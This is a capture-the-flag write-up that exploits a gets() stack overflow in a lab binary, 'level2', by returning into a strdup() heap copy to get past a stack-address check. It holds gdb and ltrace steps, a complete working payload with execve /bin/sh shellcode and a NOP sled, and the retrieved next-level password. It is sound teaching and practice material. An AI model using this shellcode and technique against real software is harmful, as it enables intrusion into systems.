 q## Vulnerability
`gets()` in function `p` → classic **stack buffer overflow**.
A check blocks stack addresses (`0xbf...`), but `strdup()` copies the buffer to the **heap** → bypass via **ret2heap**.
 
---
 
## Analysis
 
```bash
gdb ./level2
disass p
```
 
Key findings:
- Buffer at `ebp - 0x4c` → **76 bytes** to ebp, **80 bytes** to return address
- Anti-stack check: `if (ret_addr & 0xb0000000 == 0xb0000000) → _exit()`
- `strdup()` copies buffer to heap (`0x0804xxxx`) → passes the check
---
 
## Finding the heap address
 
```bash
ltrace ./level2
# input: AAAA
# → strdup("AAAA") = 0x0804a008
```
 
---
 
## Finding the exact offset
 
```bash
gdb ./level2
run <<< $(python -c "print 'A'*80 + 'BBBB'")
# → EIP = 0x42424242 ✓  (offset = 80)
```
 
---
 
## Payload
 
```
[ shellcode (21B) ][ NOP \x90 * 59 ][ heap addr (4B) ]
       21                59               4          = 84 bytes total
```
 
```bash
(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\x90' * 59 + '\x08\xa0\x04\x08'"; cat) | ./level2
```
 
---
 
## Result
 
```
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
 
